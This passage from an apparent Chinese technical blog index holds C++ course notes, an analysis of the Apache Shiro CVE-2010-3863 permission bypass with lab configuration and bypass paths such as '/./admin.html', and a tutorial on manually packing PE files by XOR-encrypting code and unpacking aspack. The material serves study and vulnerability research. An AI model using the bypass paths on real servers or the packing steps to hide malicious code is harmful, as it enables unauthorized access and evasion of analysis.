drink) &#123;\n\tdrink-&gt;MakeDrink();\n\tdelete drink;\n&#125;\n\nvoid test01() &#123;\n\tDoWork(new Coffee);\n\tcout &lt;&lt; &quot;--------------&quot; &lt;&lt; endl;\n\tDoWork(new Tea);\n&#125;\n\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n虚析构和纯虚析构多态使用时，如果子类中有属性开辟到堆区，那么父类指针在释放时无法调用到子类的析构代码\n解决方式：将父类中的析构函数改为虚析构或者纯虚析构\n虚析构和纯虚析构共性：\n\n可以解决父类指针释放子类对象\n都需要有具体的函数实现\n\n虚析构和纯虚析构区别：\n\n如果是纯虚析构，该类属于抽象类，无法实例化对象\n\n虚析构语法：\nvirtual ~类名()&#123;&#125;\n\n纯虚析构语法：\nvirtual ~类名() &#x3D; 0;\n类名::~类名()&#123;&#125;\n\n示例：\nclass Animal &#123;\npublic:\n\n\tAnimal()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Animal 构造函数调用！&quot; &lt;&lt; endl;\n\t&#125;\n\tvirtual void Speak() &#x3D; 0;\n\n\t&#x2F;&#x2F;析构函数加上virtual关键字，变成虚析构函数\n\t&#x2F;&#x2F;virtual ~Animal()\n\t&#x2F;&#x2F;&#123;\n\t&#x2F;&#x2F;\tcout &lt;&lt; &quot;Animal虚析构函数调用！&quot; &lt;&lt; endl;\n\t&#x2F;&#x2F;&#125;\n\n\n\tvirtual ~Animal() &#x3D; 0;\n&#125;;\n\nAnimal::~Animal()\n&#123;\n\tcout &lt;&lt; &quot;Animal 纯虚析构函数调用！&quot; &lt;&lt; endl;\n&#125;\n\n&#x2F;&#x2F;和包含普通纯虚函数的类一样，包含了纯虚析构函数的类也是一个抽象类。不能够被实例化。\n\nclass Cat : public Animal &#123;\npublic:\n\tCat(string name)\n\t&#123;\n\t\tcout &lt;&lt; &quot;Cat构造函数调用！&quot; &lt;&lt; endl;\n\t\tm_Name &#x3D; new string(name);\n\t&#125;\n\tvirtual void Speak()\n\t&#123;\n\t\tcout &lt;&lt; *m_Name &lt;&lt;  &quot;小猫在说话!&quot; &lt;&lt; endl;\n\t&#125;\n\t~Cat()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Cat析构函数调用!&quot; &lt;&lt; endl;\n\t\tif (this-&gt;m_Name !&#x3D; NULL) &#123;\n\t\t\tdelete m_Name;\n\t\t\tm_Name &#x3D; NULL;\n\t\t&#125;\n\t&#125;\n\npublic:\n\tstring *m_Name;\n&#125;;\n\nvoid test01()\n&#123;\n\tAnimal *animal &#x3D; new Cat(&quot;Tom&quot;);\n\tanimal-&gt;Speak();\n\n\t&#x2F;&#x2F;通过父类指针去释放，会导致子类对象可能清理不干净，造成内存泄漏\n\t&#x2F;&#x2F;怎么解决？给基类增加一个虚析构函数\n\t&#x2F;&#x2F;虚析构函数就是用来解决通过父类指针释放子类对象\n\tdelete animal;\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n总结：\n\n虚析构或纯虚析构就是用来解决通过父类指针释放子类对象\n如果子类中没有堆区数据，可以不写为虚析构或纯虚析构\n拥有纯虚析构函数的类也属于抽象类\n\n多态案例三-电脑组装案例描述：\n电脑主要组成部件为 CPU（用于计算），显卡（用于显示），内存条（用于存储）\n将每个零件封装出抽象基类，并且提供不同的厂商生产不同的零件，例如Intel厂商和Lenovo厂商\n创建电脑类提供让电脑工作的函数，并且调用每个零件工作的接口\n测试时组装三台不同的电脑进行工作\n示例：\n#include&lt;iostream&gt;\nusing namespace std;\n\n&#x2F;&#x2F;抽象CPU类\nclass CPU\n&#123;\npublic:\n\t&#x2F;&#x2F;抽象的计算函数\n\tvirtual void calculate() &#x3D; 0;\n&#125;;\n\n&#x2F;&#x2F;抽象显卡类\nclass VideoCard\n&#123;\npublic:\n\t&#x2F;&#x2F;抽象的显示函数\n\tvirtual void display() &#x3D; 0;\n&#125;;\n\n&#x2F;&#x2F;抽象内存条类\nclass Memory\n&#123;\npublic:\n\t&#x2F;&#x2F;抽象的存储函数\n\tvirtual void storage() &#x3D; 0;\n&#125;;\n\n&#x2F;&#x2F;电脑类\nclass Computer\n&#123;\npublic:\n\tComputer(CPU * cpu, VideoCard * vc, Memory * mem)\n\t&#123;\n\t\tm_cpu &#x3D; cpu;\n\t\tm_vc &#x3D; vc;\n\t\tm_mem &#x3D; mem;\n\t&#125;\n\n\t&#x2F;&#x2F;提供工作的函数\n\tvoid work()\n\t&#123;\n\t\t&#x2F;&#x2F;让零件工作起来，调用接口\n\t\tm_cpu-&gt;calculate();\n\n\t\tm_vc-&gt;display();\n\n\t\tm_mem-&gt;storage();\n\t&#125;\n\n\t&#x2F;&#x2F;提供析构函数 释放3个电脑零件\n\t~Computer()\n\t&#123;\n\n\t\t&#x2F;&#x2F;释放CPU零件\n\t\tif (m_cpu !&#x3D; NULL)\n\t\t&#123;\n\t\t\tdelete m_cpu;\n\t\t\tm_cpu &#x3D; NULL;\n\t\t&#125;\n\n\t\t&#x2F;&#x2F;释放显卡零件\n\t\tif (m_vc !&#x3D; NULL)\n\t\t&#123;\n\t\t\tdelete m_vc;\n\t\t\tm_vc &#x3D; NULL;\n\t\t&#125;\n\n\t\t&#x2F;&#x2F;释放内存条零件\n\t\tif (m_mem !&#x3D; NULL)\n\t\t&#123;\n\t\t\tdelete m_mem;\n\t\t\tm_mem &#x3D; NULL;\n\t\t&#125;\n\t&#125;\n\nprivate:\n\n\tCPU * m_cpu; &#x2F;&#x2F;CPU的零件指针\n\tVideoCard * m_vc; &#x2F;&#x2F;显卡零件指针\n\tMemory * m_mem; &#x2F;&#x2F;内存条零件指针\n&#125;;\n\n&#x2F;&#x2F;具体厂商\n&#x2F;&#x2F;Intel厂商\nclass IntelCPU :public CPU\n&#123;\npublic:\n\tvirtual void calculate()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Intel的CPU开始计算了！&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\n\nclass IntelVideoCard :public VideoCard\n&#123;\npublic:\n\tvirtual void display()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Intel的显卡开始显示了！&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\n\nclass IntelMemory :public Memory\n&#123;\npublic:\n\tvirtual void storage()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Intel的内存条开始存储了！&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\n\n&#x2F;&#x2F;Lenovo厂商\nclass LenovoCPU :public CPU\n&#123;\npublic:\n\tvirtual void calculate()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Lenovo的CPU开始计算了！&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\n\nclass LenovoVideoCard :public VideoCard\n&#123;\npublic:\n\tvirtual void display()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Lenovo的显卡开始显示了！&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\n\nclass LenovoMemory :public Memory\n&#123;\npublic:\n\tvirtual void storage()\n\t&#123;\n\t\tcout &lt;&lt; &quot;Lenovo的内存条开始存储了！&quot; &lt;&lt; endl;\n\t&#125;\n&#125;;\n\n\nvoid test01()\n&#123;\n\t&#x2F;&#x2F;第一台电脑零件\n\tCPU * intelCpu &#x3D; new IntelCPU;\n\tVideoCard * intelCard &#x3D; new IntelVideoCard;\n\tMemory * intelMem &#x3D; new IntelMemory;\n\n\tcout &lt;&lt; &quot;第一台电脑开始工作：&quot; &lt;&lt; endl;\n\t&#x2F;&#x2F;创建第一台电脑\n\tComputer * computer1 &#x3D; new Computer(intelCpu, intelCard, intelMem);\n\tcomputer1-&gt;work();\n\tdelete computer1;\n\n\tcout &lt;&lt; &quot;-----------------------&quot; &lt;&lt; endl;\n\tcout &lt;&lt; &quot;第二台电脑开始工作：&quot; &lt;&lt; endl;\n\t&#x2F;&#x2F;第二台电脑组装\n\tComputer * computer2 &#x3D; new Computer(new LenovoCPU, new LenovoVideoCard, new LenovoMemory);;\n\tcomputer2-&gt;work();\n\tdelete computer2;\n\n\tcout &lt;&lt; &quot;-----------------------&quot; &lt;&lt; endl;\n\tcout &lt;&lt; &quot;第三台电脑开始工作：&quot; &lt;&lt; endl;\n\t&#x2F;&#x2F;第三台电脑组装\n\tComputer * computer3 &#x3D; new Computer(new LenovoCPU, new IntelVideoCard, new LenovoMemory);;\n\tcomputer3-&gt;work();\n\tdelete computer3;\n\n&#125;\n\n文件操作程序运行时产生的数据都属于临时数据，程序一旦运行结束都会被释放\n通过文件可以将数据持久化\nC++中对文件操作需要包含头文件 &#x3D;&#x3D;&lt; fstream &gt;&#x3D;&#x3D;\n文件类型分为两种：\n\n文本文件 - 文件以文本的ASCII码形式存储在计算机中\n二进制文件 - 文件以文本的二进制形式存储在计算机中，用户一般不能直接读懂它们\n\n操作文件的三大类:\n\nofstream：写操作\nifstream： 读操作\nfstream ： 读写操作\n\n文本文件写文件写文件步骤如下：\n\n包含头文件\n#include\n\n创建流对象\nofstream ofs;\n\n打开文件\nofs.open(“文件路径”,打开方式);\n\n写数据\nofs &lt;&lt; “写入的数据”;\n\n关闭文件\nofs.close();\n\n\n文件打开方式：\n\n\n\n打开方式\n解释\n\n\n\nios::in\n为读文件而打开文件\n\n\nios::out\n为写文件而打开文件\n\n\nios::ate\n初始位置：文件尾\n\n\nios::app\n追加方式写文件\n\n\nios::trunc\n如果文件存在先删除，再创建\n\n\nios::binary\n二进制方式\n\n\n注意： 文件打开方式可以配合使用，利用|操作符\n例如：用二进制方式写文件 ios::binary | ios:: out\n示例：\n#include &lt;fstream&gt;\n\nvoid test01()\n&#123;\n\tofstream ofs;\n\tofs.open(&quot;test.txt&quot;, ios::out);\n\n\tofs &lt;&lt; &quot;姓名：张三&quot; &lt;&lt; endl;\n\tofs &lt;&lt; &quot;性别：男&quot; &lt;&lt; endl;\n\tofs &lt;&lt; &quot;年龄：18&quot; &lt;&lt; endl;\n\n\tofs.close();\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n总结：\n\n文件操作必须包含头文件 fstream\n读文件可以利用 ofstream ，或者fstream类\n打开文件时候需要指定操作文件的路径，以及打开方式\n利用&lt;&lt;可以向文件中写数据\n操作完毕，要关闭文件\n\n读文件读文件与写文件步骤相似，但是读取方式相对于比较多\n读文件步骤如下：\n\n包含头文件\n#include\n\n创建流对象\nifstream ifs;\n\n打开文件并判断文件是否打开成功\nifs.open(“文件路径”,打开方式);\n\n读数据\n四种方式读取\n\n关闭文件\nifs.close();\n\n\n示例：\n#include &lt;fstream&gt;\n#include &lt;string&gt;\nvoid test01()\n&#123;\n\tifstream ifs;\n\tifs.open(&quot;test.txt&quot;, ios::in);\n\n\tif (!ifs.is_open())\n\t&#123;\n\t\tcout &lt;&lt; &quot;文件打开失败&quot; &lt;&lt; endl;\n\t\treturn;\n\t&#125;\n\n\t&#x2F;&#x2F;第一种方式\n\t&#x2F;&#x2F;char buf[1024] &#x3D; &#123; 0 &#125;;\n\t&#x2F;&#x2F;while (ifs &gt;&gt; buf)\n\t&#x2F;&#x2F;&#123;\n\t&#x2F;&#x2F;\tcout &lt;&lt; buf &lt;&lt; endl;\n\t&#x2F;&#x2F;&#125;\n\n\t&#x2F;&#x2F;第二种\n\t&#x2F;&#x2F;char buf[1024] &#x3D; &#123; 0 &#125;;\n\t&#x2F;&#x2F;while (ifs.getline(buf,sizeof(buf)))\n\t&#x2F;&#x2F;&#123;\n\t&#x2F;&#x2F;\tcout &lt;&lt; buf &lt;&lt; endl;\n\t&#x2F;&#x2F;&#125;\n\n\t&#x2F;&#x2F;第三种\n\t&#x2F;&#x2F;string buf;\n\t&#x2F;&#x2F;while (getline(ifs, buf))\n\t&#x2F;&#x2F;&#123;\n\t&#x2F;&#x2F;\tcout &lt;&lt; buf &lt;&lt; endl;\n\t&#x2F;&#x2F;&#125;\n\n\tchar c;\n\twhile ((c &#x3D; ifs.get()) !&#x3D; EOF)\n\t&#123;\n\t\tcout &lt;&lt; c;\n\t&#125;\n\n\tifs.close();\n\n\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n总结：\n\n读文件可以利用 ifstream ，或者fstream类\n利用is_open函数可以判断文件是否打开成功\nclose 关闭文件\n\n二进制文件以二进制的方式对文件进行读写操作\n打开方式要指定为 &#x3D;&#x3D;ios::binary&#x3D;&#x3D;\n写文件二进制方式写文件主要利用流对象调用成员函数write\n函数原型 ：ostream&amp; write(const char * buffer,int len);\n参数解释：字符指针buffer指向内存中一段存储空间。len是读写的字节数\n示例：\n#include &lt;fstream&gt;\n#include &lt;string&gt;\n\nclass Person\n&#123;\npublic:\n\tchar m_Name[64];\n\tint m_Age;\n&#125;;\n\n&#x2F;&#x2F;二进制文件  写文件\nvoid test01()\n&#123;\n\t&#x2F;&#x2F;1、包含头文件\n\n\t&#x2F;&#x2F;2、创建输出流对象\n\tofstream ofs(&quot;person.txt&quot;, ios::out | ios::binary);\n\t\n\t&#x2F;&#x2F;3、打开文件\n\t&#x2F;&#x2F;ofs.open(&quot;person.txt&quot;, ios::out | ios::binary);\n\n\tPerson p &#x3D; &#123;&quot;张三&quot;  , 18&#125;;\n\n\t&#x2F;&#x2F;4、写文件\n\tofs.write((const char *)&amp;p, sizeof(p));\n\n\t&#x2F;&#x2F;5、关闭文件\n\tofs.close();\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n总结：\n\n文件输出流对象 可以通过write函数，以二进制方式写数据\n\n读文件二进制方式读文件主要利用流对象调用成员函数read\n函数原型：istream&amp; read(char *buffer,int len);\n参数解释：字符指针buffer指向内存中一段存储空间。len是读写的字节数\n示例：\n#include &lt;fstream&gt;\n#include &lt;string&gt;\n\nclass Person\n&#123;\npublic:\n\tchar m_Name[64];\n\tint m_Age;\n&#125;;\n\nvoid test01()\n&#123;\n\tifstream ifs(&quot;person.txt&quot;, ios::in | ios::binary);\n\tif (!ifs.is_open())\n\t&#123;\n\t\tcout &lt;&lt; &quot;文件打开失败&quot; &lt;&lt; endl;\n\t&#125;\n\n\tPerson p;\n\tifs.read((char *)&amp;p, sizeof(p));\n\n\tcout &lt;&lt; &quot;姓名： &quot; &lt;&lt; p.m_Name &lt;&lt; &quot; 年龄： &quot; &lt;&lt; p.m_Age &lt;&lt; endl;\n&#125;\n\nint main() &#123;\n\n\ttest01();\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\n\n文件输入流对象 可以通过read函数，以二进制方式读数据\n\n\n\n\n\n\n\n\n\n\n注明：本文来自https://github.com/AnkerLeng/Cpp-0-1-Resource\n","slug":"C++核心编程","date":"2020-11-21T12:53:51.000Z","categories_index":"C/C++","tags_index":"C/C++基础","author_index":"Akpigs"},{"id":"897e4bf7aafe9ea58ed211d851b9242c","title":"CVE-2010-3863权限绕过分析","content":"\n\n\n\n\n\n\n\n\n旅行者,本破站点旨在原创文章记录学习经历&amp;&amp;收集优秀资源减少学习成本，如果您又更好的想法请联系我。让我们一起传承开源精神🤓……\nCVE-2010-3863权限绕过分析初识shiro\n\n\n\n\n\n\n\n\nApache Shiro™是一个功能强大且易于使用的 Java 安全框架，它执行身份验证、授权、加密和会话管理。借助 Shiro 易于理解的 API，您可以快速轻松地保护任何应用程序——从最小的移动应用程序到最大的 Web 和企业应用程序。\n从官方简介中可以得知 shiro 是一套权限管理框架，在 shiro 框架中有以下三个核心概念模块：Subject、SecurityManger和Realms\n\nSubject：当前正在执行的用户\nSecurityManger：安全管理器，管理所有用户的操作，是 shiro 架构的核心\nRealm：封装数据源，充当 shiro 与应用程序安全数据之间的桥梁，当需要与安全相关的数据(如用户帐户)进行实际交互以执行身份验证(登录)和授权(访问控制)时，为其提供身份验证或者授权。\n\n因此一次 请求–&gt; 认证 –&gt; 授权的流程为：\n\nweb 应用程序获取当前的Subject并调用该Subject的校验方法；\nSubject传递校验到SecurityManger进行处理并进行判断；\nSecurityManger调用Realm获取配置信息，通过该配置信息判断当前的Subject所属角色是否能够进行操作。\n\n漏洞环境该漏洞环境已经上传到 github 仓库上：https://github.com/dota-st/vulnEnv\n首先在配置文件realm.ini中定义了用户账号密码以及对应角色权限\nShiroConfig\n@Configuration\npublic class ShiroConfig &#123;\n\n    @Bean\n    public IniRealm getIniRealm()&#123;\n        return new IniRealm(&quot;classpath:realm.ini&quot;);\n    &#125;\n\n    @Bean\n    public DefaultWebSecurityManager getDefaultWebSecurityManager(Realm realm)&#123;\n        return new DefaultWebSecurityManager(realm);\n    &#125;\n\n\n    &#x2F;*\n     * anon：无需认证就可以访问\n     * authc：必须认证才能访问\n     * user：必须拥有记住我功能才能访问\n     * perms：拥有某个资源的权限才能访问\n     * role：拥有某个角色的权限才能访问\n     * *&#x2F;\n    @Bean\n    ShiroFilterFactoryBean getShiroFilterFactoryBean(DefaultWebSecurityManager defaultWebSecurityManager) &#123;\n        ShiroFilterFactoryBean bean &#x3D; new ShiroFilterFactoryBean();\n        bean.setSecurityManager(defaultWebSecurityManager);\n        bean.setLoginUrl(&quot;&#x2F;login.html&quot;);\n        LinkedHashMap&lt;String, String&gt; map &#x3D; new LinkedHashMap&lt;String, String&gt;();\n        map.put(&quot;&#x2F;admin.html&quot;, &quot;authc, roles[admin]&quot;);\n        map.put(&quot;&#x2F;user.html&quot;, &quot;authc, roles[user]&quot;);\n        map.put(&quot;&#x2F;**&quot;, &quot;anon&quot;);\n        bean.setFilterChainDefinitionMap(map);\n        return bean;\n    &#125;\n&#125;\n\nUserController\n@Controller\npublic class UserController &#123;\n\n    @PostMapping(&quot;&#x2F;doLogin&quot;)\n    public String doLoginPage(@RequestParam(&quot;username&quot;) String username, @RequestParam(&quot;password&quot;) String password, @RequestParam(name&#x3D;&quot;rememberme&quot;, defaultValue&#x3D;&quot;&quot;) String rememberMe)&#123;\n        if(ShiroUtil.login(username, password))&#123;\n            if(ShiroUtil.hasRole(&quot;admin&quot;))&#123;\n                return &quot;redirect:&#x2F;admin.html&quot;;\n            &#125; else if (ShiroUtil.hasRole(&quot;user&quot;)) &#123;\n                return &quot;redirect:&#x2F;user.html&quot;;\n            &#125;\n        &#125;\n        return &quot;redirect:&#x2F;unauth.html&quot;;\n    &#125;\n\n    @RequestMapping(value&#x3D;&#123;&quot;&#x2F;&quot;&#125;)\n    public String helloPage() throws Exception &#123;\n\n        return &quot;redirect:&#x2F;login.html&quot;;\n    &#125;\n&#125;\n\n漏洞分析影响版本：shiro &lt; 1.1.0\nshiro 使用org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain()方法获取和调用执行的filter\n在上图中可以看到，通过getPathWithinApplication()方法获取到我们传入的请求路径/./admin.html，接着通过filterChainManager.getChainNames()方法取出我们的配置\n[&#x2F;admin.html, &#x2F;user.html, &#x2F;**]\n\n我们这里跟进一下getPathWithinApplication()方法\n继续跟进getPathWithinApplication()方法\n在getRequestUri()方法中返回了/./admin.html，继续跟进getRequestUri()方法\n最后会 return 到decodeAndCleanUriString()方法，继续跟进该方法\n首先对 URL 进行 URL 解码，并对;进行截取，查了一下\n\n\n\n\n\n\n\n\n\ndecodeAndCleanUriString() 是 URL Decode 及针对 JBoss&#x2F;Jetty 等中间件在 url 处添加 ;jsessionid 之类的字符串的适配，对 ; 进行了截取。\n接下来getChain()方法往下走进行while循环，通过pathMatches()-&gt;pathMatcher.matches()方法进行匹配\n通过前面对请求处理的跟踪，可以发现在匹配之前没有对传进来的URL进行标准化路径处理，如果构造一下请求路径就有可能绕过权限校验。\n回顾一下，我们的配置如下所示，设置admin.html文件只有amdin用户角色才能访问，同时设置/**为anon\n@Bean\n    ShiroFilterFactoryBean getShiroFilterFactoryBean(DefaultWebSecurityManager defaultWebSecurityManager) &#123;\n        ShiroFilterFactoryBean bean &#x3D; new ShiroFilterFactoryBean();\n        bean.setSecurityManager(defaultWebSecurityManager);\n        bean.setLoginUrl(&quot;&#x2F;login.html&quot;);\n        LinkedHashMap&lt;String, String&gt; map &#x3D; new LinkedHashMap&lt;String, String&gt;();\n        map.put(&quot;&#x2F;admin.html&quot;, &quot;authc, roles[admin]&quot;);\n        map.put(&quot;&#x2F;user.html&quot;, &quot;authc, roles[user]&quot;);\n        map.put(&quot;&#x2F;**&quot;, &quot;anon&quot;);\n        bean.setFilterChainDefinitionMap(map);\n        return bean;\n    &#125;\n\n访问admin.html，因为没有admin权限，校验失败故 302 跳转到了login.html\n访问/./admin.html或者/aa/../admin.html，在while循环中，与前面的/admin.html和/user.html匹配失败，进而进入了/**的匹配范围，成功访问到admin.html文件\n","slug":"CVE-2010-3863","date":"2020-11-09T16:18:15.000Z","categories_index":"Java安全","tags_index":"Java安全","author_index":"Akpigs"},{"id":"c389a93a9c4f740048ca4cf923519873","title":"C/C++复习","content":"\n\n\n\n\n\n\n\n\nhttps://github.com/hugang-first/Cpp-0-1-Resource\n","slug":"C-C-复习","date":"2020-10-30T15:02:57.000Z","categories_index":"C/C++","tags_index":"C/C++基础","author_index":"Akpigs"},{"id":"d5e1f921b320f1d632be0f3eb7b4b1ce","title":"Windows脱壳-基础","content":"\n\n\n\n\n\n\n\n\n旅行者,本破站点旨在原创文章记录学习经历&amp;&amp;收集优秀资源减少学习成本，如果您又更好的想法请联系我。让我们一起传承开源精神🤓……\n知识点回顾1、PE文件的Magic code(魔数、幻数)是什么？\n MZ头、PE头\n2、PE文件中文件头的信息有哪些？\n 运行平台、时间戳、PE文件属性、区段数量、扩展头的大小\n3、PE文件中扩展头的信息有哪些？\n EP的RVA、ImageBase(400000)、代码段起始地址、数据段起始地址 数据目录表、数据目录表项数量、文件对齐、内存对齐、映像总大小\n4、 PE文件中区段信息有哪些？\n 区段名称、虚拟地址、虚拟大小、文件偏移、文件大小、区段属性(C0000020、60000020)\n5、PE文件中数据目录表有哪些表？\n 导出表、导入表、异常表、tls表、资源表、IAT、重定位表\n6、一个进程，三环下有哪些数据结构？\n 进程环境块(PEB)、线程环境块(TEB)、tls结构\n7、导入表结构体字段有几个，分别是什么？\n 5个字段\n 第一个是OrginalFirstThunk,里面是rva,指向的INT，\n 第二个是时间戳，\n 第三个是转发机 制用到的ForWarderChain,\n 第四个是name,rva,dll名称字符串，\n 第五个是FirstThunk，指向的是 IAT。 INT或IAT在文件中存的是一样的，存的是指向名称字符串的rva或者一个序号\n手工加壳目标：将代码段加密，以防止IDA等静态工具分析。\n步骤：\n\n添加一个区段(文件大小、区段数量)\n将原OEP修改为新区段中的地址\n将代码段异或加密\n在新区段新OEP处，添加异或解密代码\n\n注意: ① 代码段默认没有可写属性，需要修改。 ② 有随机基址属性的程序会重定位代码，一般我们会去掉这个属性 如果没有去掉，就需要在壳代码中进行重定位\n具体步骤添加区段\n\n使用LordPE编辑区段信息\n\n\n再使用010Editor添加文件数据\n\n\n修改OEP，增加OEP代码原OEP：000011D2 新OEP：17000 修改OEP\n\n\n添加代码\n\n\n通过技巧获取基地址再跳转\n\n\n另一种改法\n\n\n关于代码的演化\n① 如果直接去掉随机基址，我们可以在新OEP处，直接写代码跳转到原始OEP\n\n\n② 我们可以在新OEP处定义出模块基地址，然后再加上原始OEP RVA\n\n\n③ 可以在新OEP处通过call pop 组合获取当前指令地址，再减去偏移，计算出模块基址\n\n\n以上代码的机器码复制到有随机基址的同一程序同一位置中，同样也是可以正常运行的\n\n\n加密代码段代码段信息\n\n\n在010Editor中操作代码段\n选中代码段\n\n\n异或代码段\n\n\n增加解密代码由于代码段本身有重定位信息，那么如果加密之后，重定位会出现问题，所以应该去掉随机基址 40 81 -&gt; 00 81\n\n\n脱壳脱壳的目的：\nCracker(破解者) 脱壳、解密、破解\n杀毒引擎(脱壳引擎、反病毒虚拟机) 解密、查杀病毒、扫描特征\n\n脱壳的步骤：\n找到原始OEP\n一般来说，找到原始OEP或者我们跟踪到原始OEP时，程序都会完成解密操作\n\nDump内存到文件\n当可执行文件在内存已经完成解密之后，我们将内存中代码数据转储(dump)到文件，就可以进 行进一步分析。\n\n修复文件(常见于修复IAT，重建导入表)\n从内存中转储的内存数据代码有一些与原本文件中的内容是不一致的。比如说IAT表，内存中IAT 表会被初始为函数地址表，而文件中IAT表与INT表内容一致。所以要想让程序正常运行，一般 都需要修复IAT，因为加壳之后程序一般都会自己去处理导入表、IAT以及重定位等。\n\n\n导入表和IAT)\n\n\n脱自己加的壳\n找到原始OEP\n单步跟踪，很容易找到原始OEP\n\nDump内存到文件\n在原始OEP处进行DUMP内存，原因就是这个时候内存没有做太多的初始化\n\n\n3.修复IAT或者修复导入表\n使用ImportREC修复\n\n\n\n\n概述脱壳是一项综合技术，结合PE文件格式、汇编指令的分析，调试加密的程序并将其还原的一 个过程。\n壳一般分为两种，加密壳和压缩壳，里面所使用的技术有，压缩算法、对代码加密、对IAT 加密、对资源加密。 我们从简单入手-压缩壳。\n关于压缩算法\n有损压缩 一个像素点：RGB 红绿蓝 一个图片：(3,4,5),(4,5,3),(5,4,3) 压缩后：(4,4,4),3\n无损压缩 一个文件：0,0,0,0,0,0,0 压缩后：0,7\n\n脱壳三步法\n寻找原始OEP\ndump内存到文件\n修复文件\n\n脱壳三步法-寻找OEP技巧\n堆栈平衡法(ESP定律\n壳代码就像一个函数，进入时会开辟堆栈、保存寄存器环境，退出时会恢复堆栈、恢复 寄存器。所以应该是堆栈平衡的，那我们可以在壳代码操作了堆栈后对堆栈设置访问或 写入断点，然后运行程序，当断点命中的时候，应该就是退出壳代码的时候。在其附近 单步几次，应该就能到达程序的原始OEP。\n\n特征定位法\n在我们熟悉的程序中，我们可以使用特征来定位程序原始OEP。特征有几种： ① 二进制特征 比如release版的VS2013是: oep入口特征：E8????????E9 第一个CALL内的特征:5657BF4EE640BBBE0000FFFF3BC7 ② API特征 比如release版的VS2013的第一个API调用是： GetSystemTimeAsFileTime 比如vc6.0的第一个API调用是： GetVersion 比如Delphi程序第一个API调用是： GetModuleHandleA ③编译器特征 IAT调用不同的编译器生成的调用机器码是不一样 vs -》 call [IAT地址] -》 FF15 xx xx xx xx delphi -&gt; jmp [IAT地址] -》 FF25 xx xx xx xx\n\n\n脱壳练习壳代码的基本流程① 保存寄存器环境\n② 加载一些必要的API\n③ 解密代码和数据\n④ 修复重定位\n⑤ 填充IAT\n⑥ 恢复寄存器环境\n脱壳-0.aspack.exe壳代码分析1、壳OEP\n\n2、加载必要API\n\n3、解密解压缩代码\n\n4、修复重定位\n\n修复重定位的公式：\n重定位表中存储两个有用字段：\n\n需要重定位的分页地址\n需要重定位的分页偏移 重定位分为两步：\n计算出 重定位地址，要重定位的地址&#x3D;模块基地址+分页地址+分页偏移\n修复要重定位的地址中数据，[要重定位的地址] - 默认模块基地址 + 当前模块基地址\n\n5、填充IAT原理：\n① 从导入表中获取dll名称\n② 从导入表中的INT，获取函数名称或者序号\n③ 通过GetModuleHandleA或者LoadLibraryA获取模块基地址、通过GetProcAddress获取函数地址\n④ 将函数地址填充到对应IAT数组中\n001D726F 03F2 ADD ESI,EDX \t\t\t\t\t\t\t\t; esi&#x3D;导入表结构\n001D7271 8B46 0C MOV EAX,DWORD PTR DS:[ESI+0xC] \t\t; 获取模块DLL名称RVA\n001D7274 85C0 TEST EAX,EAX\n001D7276 0F84 0D010000 JE 00_aspac.001D7389\n001D727C 03C2 ADD EAX,EDX \t\t\t\t\t\t\t\t; 加上基地址，字符串VA\n001D727E 8BD8 MOV EBX,EAX\n001D7280 50 PUSH EAX\n001D7281 FF95 A90F0000 CALL DWORD PTR SS:[EBP+0xFA9] \t; 获取模块基地址\n001D7287 85C0 TEST EAX,EAX\n001D7289 75 07 JNZ SHORT 00_aspac.001D7292\n001D728B 53 PUSH EBX\n001D728C FF95 AD0F0000 CALL DWORD PTR SS:[EBP+0xFAD]\n001D7292 8985 A9050000 MOV DWORD PTR SS:[EBP+0x5A9],EAX ; 保存模块基地址\n001D7298 C785 AD050000&gt;MOV DWORD PTR SS:[EBP+0x5AD],0x0\n001D72A2 8B95 88040000 MOV EDX,DWORD PTR SS:[EBP+0x488] ; 获取基地址\n001D72A8 8B06 MOV EAX,DWORD PTR DS:[ESI] \t\t\t; 获取指向OrignalFirstTh\n001D72AA 85C0 TEST EAX,EAX\n001D72AC 75 03 JNZ SHORT 00_aspac.001D72B1\n001D72AE 8B46 10 MOV EAX,DWORD PTR DS:[ESI+0x10]\n001D72B1 03C2 ADD EAX,EDX \t\t\t\t\t\t\t; 计算得出 OrignalFirstT\n001D72B3 0385 AD050000 ADD EAX,DWORD PTR SS:[EBP+0x5AD] ; 0\n001D72B9 8B18 MOV EBX,DWORD PTR DS:[EAX] \t\t\t; 获取INT中的数据，即指向\n001D72BB 8B7E 10 MOV EDI,DWORD PTR DS:[ESI+0x10] \t; 获取 FirstThunk\n001D72BE 03FA ADD EDI,EDX \t\t\t\t\t\t\t; 计算得出 IAT 地址\n001D72C0 03BD AD050000 ADD EDI,DWORD PTR SS:[EBP+0x5AD] ; 0\n001D72C6 85DB TEST EBX,EBX \t\t\t\t\t\t\t; 判断结束\n001D72C8 0F84 A5000000 JE 00_aspac.001D7373\n001D72CE F7C3 00000080 TEST EBX,0x80000000 \t\t\t; 判断是否是序号\n001D72D4 75 04 JNZ SHORT 00_aspac.001D72DA\n001D72D6 03DA ADD EBX,EDX \t\t\t\t\t\t\t; 指向函数字符串结构&#x3D;INT\n001D72D8 43 INC EBX \t\t\t\t\t\t\t\t; 减去2，跳过字符串结构的\n001D72D9 43 INC EBX\n001D72DA 53 PUSH EBX \t\t\t\t\t\t\t\t; 